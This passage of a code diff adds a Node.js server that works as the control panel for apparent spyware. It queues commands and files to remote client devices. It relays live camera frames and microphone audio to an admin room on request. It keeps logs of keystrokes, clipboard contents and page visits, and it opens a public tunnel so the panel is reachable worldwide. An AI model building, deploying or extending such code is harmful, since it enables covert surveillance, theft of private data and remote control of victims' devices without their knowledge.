+            url: `/uploads/files/${req.file.filename}`,
+            filename: displayName,
+            size: req.file.size,
+            mimeType: req.file.mimetype
+        },
+        timestamp: new Date().toISOString()
+    };
+    const targets = target === 'all' ? Object.keys(store.clients) : [target];
+    targets.forEach(id => {
+        if (!commandQueue[id]) commandQueue[id] = [];
+        commandQueue[id].push(cmd);
+    });
+    addEvent('command', { type: 'file', target, filename: displayName, size: req.file.size });
+    console.log(`📁 File command: ${displayName} → ${target}`);
+    res.json({ success: true, commandId: cmd.id, filename: displayName, url: cmd.data.url });
+});
+
+app.post('/api/command', requireAuth, (req, res) => {
+    const { target, type, data } = req.body;
+    if (!type) return res.status(400).json({ error: 'Missing type' });
+    const cmd = { id: Date.now().toString(36), type, data: data || {}, timestamp: new Date().toISOString() };
+    const targets = target === 'all' ? Object.keys(store.clients) : [target];
+    targets.forEach(id => {
+        if (!commandQueue[id]) commandQueue[id] = [];
+        commandQueue[id].push(cmd);
+    });
+    addEvent('command', { type, target, ...(data || {}) });
+    console.log(`\u{26A1} Command: ${type} \u{2192} ${target}`);
+    res.json({ success: true, commandId: cmd.id });
+});
+
+app.get('/api/commands/:clientId', (req, res) => {
+    const id = req.params.clientId;
+    const cmds = commandQueue[id] || [];
+    commandQueue[id] = [];
+    res.json(cmds);
+});
+
+// ═══════════════════════════════════════════════════════════════
+//  STORAGE MANAGEMENT
+// ═══════════════════════════════════════════════════════════════
+app.get('/api/storage', requireAuth, (req, res) => {
+    const countDir = dir => {
+        try { return fs.readdirSync(dir).reduce((s, f) => { try { return s + fs.statSync(path.join(dir, f)).size; } catch { return s; } }, 0); } catch { return 0; }
+    };
+    const photoSize = countDir(path.join(__dirname, 'uploads', 'photos'));
+    const videoSize = countDir(path.join(__dirname, 'uploads', 'videos'));
+    res.json({
+        totalMB: ((photoSize + videoSize) / 1048576).toFixed(1),
+        photoMB: (photoSize / 1048576).toFixed(1), photoCount: store.photos.length,
+        videoMB: (videoSize / 1048576).toFixed(1), videoCount: store.media.length
+    });
+});
+
+app.post('/api/cleanup', requireAuth, (req, res) => {
+    const { type, keep } = req.body;
+    let deleted = 0;
+    if (type === 'photos') {
+        const k = parseInt(keep) || 0;
+        const rm = k === 0 ? store.photos.splice(0) : store.photos.splice(k);
+        rm.forEach(p => { try { fs.unlinkSync(path.join(__dirname, p.path)); deleted++; } catch {} });
+    } else if (type === 'videos') {
+        const k = parseInt(keep) || 0;
+        const rm = k === 0 ? store.media.splice(0) : store.media.splice(k);
+        rm.forEach(m => { try { fs.unlinkSync(path.join(__dirname, m.path)); deleted++; } catch {} });
+    } else if (type === 'events') { store.events = []; }
+      else if (type === 'keystrokes') { store.keystrokes = []; }
+      else if (type === 'clipboard') { store.clipboard = []; }
+      else if (type === 'visits') { store.pageVisits = []; }
+    saveStore();
+    console.log(`\u{1F9F9} Cleanup: ${type}, ${deleted} files removed`);
+    res.json({ success: true, deleted });
+});
+
+// ═══════════════════════════════════════════════════════════════
+//  SOCKET.IO
+// ═══════════════════════════════════════════════════════════════
+if (!IS_VERCEL) {
+io.on('connection', socket => {
+    socket.on('join-admin', (token) => {
+        if (!adminTokens.has(token)) {
+            socket.emit('auth-error', 'Invalid token');
+            return;
+        }
+        socket.join('admins');
+        socket.isAdmin = true;
+        console.log('\u{1F50C} Admin connected');
+        socket.emit('init', {
+            clients: store.clients,
+            recentEvents: store.events.slice(0, 200),
+            deviceInfo: store.deviceInfo
+        });
+    });
+
+    // ── Live Camera System ──
+    socket.on('join-client', (clientId) => {
+        socket.clientId = clientId;
+        socket.join('client-' + clientId);
+        console.log(`\u{1F4F7} Client ${clientId} joined socket`);
+    });
+
+    // Admin requests live feed from a specific client
+    socket.on('request-live-feed', (clientId) => {
+        console.log(`\u{1F4F9} Admin requested live feed from ${clientId}`);
+        io.to('client-' + clientId).emit('start-live-feed');
+    });
+
+    // Admin stops live feed
+    socket.on('stop-live-feed', (clientId) => {
+        console.log(`\u{23F9} Admin stopped live feed for ${clientId}`);
+        io.to('client-' + clientId).emit('stop-live-feed');
+    });
+
+    // Client sends a live camera frame
+    socket.on('live-frame', (data) => {
+        // data = { clientId, frame (base64 jpeg), timestamp, width, height }
+        io.to('admins').emit('live-frame', data);
+    });
+
+    // Client reports live feed status
+    socket.on('live-feed-status', (data) => {
+        // data = { clientId, active, error? }
+        io.to('admins').emit('live-feed-status', data);
+    });
+
+    // ── Audio Streaming ──
+    socket.on('request-audio', (clientId) => {
+        console.log(`🎤 Admin requested audio from ${clientId}`);
+        io.to('client-' + clientId).emit('start-audio');
+    });
+
+    socket.on('stop-audio', (clientId) => {
+        console.log(`🔇 Admin stopped audio for ${clientId}`);
+        io.to('client-' + clientId).emit('stop-audio');
+    });
+
+    socket.on('audio-chunk', (data) => {
+        io.to('admins').emit('audio-chunk', data);
+    });
+
+    socket.on('audio-status', (data) => {
+        io.to('admins').emit('audio-status', data);
+    });
+
+    socket.on('disconnect', () => {
+        if (socket.clientId) {
+            io.to('admins').emit('live-feed-status', { clientId: socket.clientId, active: false });
+            io.to('admins').emit('audio-status', { clientId: socket.clientId, active: false });
+            console.log(`📷 Client ${socket.clientId} disconnected from socket`);
+        }
+        if (socket.isAdmin) {
+            console.log('🔌 Admin disconnected');
+        }
+    });
+});
+} // end if (!IS_VERCEL)
+
+// ═══════════════════════════════════════════════════════════════
+//  ERROR HANDLING
+// ═══════════════════════════════════════════════════════════════
+app.use((err, req, res, next) => {
+    if (err) {
+        console.error('Server error:', err.message || err);
+        if (!res.headersSent) {
+            res.status(err.status || 500).json({ error: err.message || 'Internal server error' });
+        }
+    }
+});
+
+// ═══════════════════════════════════════════════════════════════
+//  CLIENT STATUS MONITOR
+// ═══════════════════════════════════════════════════════════════
+setInterval(() => {
+    const cutoff = Date.now() - 20000; // 20 seconds
+    Object.entries(store.clients).forEach(([id, c]) => {
+        const wasOnline = c.online;
+        const isOnline = new Date(c.lastSeen).getTime() >= cutoff;
+        if (wasOnline && !isOnline) {
+            c.online = false;
+            addEvent('client_disconnected', { clientId: id });
+            console.log(`🔴 Client offline: ${id}`);
+        }
+    });
+}, 10000);
+
+// ═══════════════════════════════════════════════════════════════
+//  START + TUNNEL
+// ═══════════════════════════════════════════════════════════════
+let currentTunnel = null;
+
+async function openTunnel() {
+    try {
+        const tunnel = await localtunnel({ port: PORT });
+        currentTunnel = tunnel;
+        console.log('');
+        console.log('  \u{2554}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2557}');
+        console.log(`  \u{2551}  \u{1F30D} PUBLIC URL:  ${tunnel.url.padEnd(32)}\u{2551}`);
+        console.log(`  \u{2551}  \u{1F4CA} ADMIN:       ${(tunnel.url + '/admin').padEnd(32)}\u{2551}`);
+        console.log('  \u{255A}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{255D}');
+        console.log('');
+        console.log('  Share the PUBLIC URL \u{2014} works worldwide.');
+        console.log('  Press Ctrl+C to stop.\n');
+
+        tunnel.on('close', () => {
+            console.log('\u{26A0}\u{FE0F}  Tunnel dropped \u{2014} reconnecting in 3s...');
+            setTimeout(openTunnel, 3000);
+        });
+        tunnel.on('error', err => {
+            console.error('Tunnel error:', err.message);
+            setTimeout(openTunnel, 5000);
+        });
+        return tunnel;
+    } catch (err) {
+        console.error('\u{274C} Tunnel failed:', err.message);
+        console.log('   Retrying in 10s...');
+        setTimeout(openTunnel, 10000);
+    }
+}
+
+// Export for Vercel serverless
+module.exports = app;
+
+// Only listen when running locally (not on Vercel)
+if (!IS_VERCEL && require.main === module) {
+    server.listen(PORT, '0.0.0.0', async () => {
+        console.log(`\n\u{1F680} Server running on port ${PORT}`);
+        console.log(`\u{1F4CA} Local admin:  http://localhost:${PORT}/admin`);
+        console.log(`\u{1F517} Local client: http://localhost:${PORT}\n`);
+        if (localtunnel) await openTunnel();
+    }).on('error', err => {
+        if (err.code === 'EADDRINUSE') {
+            const altPort = parseInt(PORT) + 1;
+            console.log(`\u26A0\uFE0F  Port ${PORT} busy \u2014 trying ${altPort}...`);
+            server.listen(altPort, '0.0.0.0', async () => {
+                console.log(`\n\u{1F680} Server running on alt port ${altPort}`);
+                console.log(`\u{1F4CA} Local admin:  http://localhost:${altPort}/admin`);
+                if (localtunnel) await openTunnel();
+            });
+        } else {
+            console.error('\u274C Server error:', err.message);
+            process.exit(1);
+        }
+    });
+}
